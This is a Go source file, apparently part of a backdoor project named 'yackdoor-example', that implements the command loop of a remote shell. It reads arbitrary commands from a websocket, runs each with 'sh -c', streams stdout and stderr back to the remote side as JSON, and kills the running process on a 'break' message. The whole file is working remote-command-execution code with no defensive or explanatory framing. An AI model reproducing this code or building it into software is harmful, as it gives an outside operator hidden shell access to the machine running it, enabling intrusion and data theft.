package Communicate

import (
	"encoding/json"
	"log"
	"os/exec"

	"github.com/bruh-boys/yackdoor-example/api"
	"golang.org/x/net/websocket"
)

func GetCommand(conn *websocket.Conn) {
	for {
		msg := make([]byte, 500)
		n, err := conn.Read(msg)
		if err != nil {
			log.Fatal(err)
		}
		commandExecChan <- string(msg[:n])
	}
}
func ExecuteCommand() {
	for {
		command := <-commandExecChan
		log.Println(command)
		if command == "break" {
			secondCommand <- command
			continue
		}

		cmd = exec.Command("sh", "-c", command)

		cmd.Stdout = &(b)
		cmd.Stderr = &(b)

		cmd.Start()
		exited <- true

	}

}

func GetOutAndErr(conn *websocket.Conn) {

	for {
		if b.String() != "" {

			log.Println(b.String())

			json.NewEncoder(conn).Encode(api.ApiOutput{
				ForWho: "idk",
				Output: b.String(),
				Exited: <-exited,
			})
			b.Reset()

		}
	}
}
func KillProcess() {

	for {
		<-secondCommand
		log.Println("okay , wait please")
		exited <- true
		if err := cmd.Process.Kill(); err != nil {
			log.Println(err)

		}

	}
}
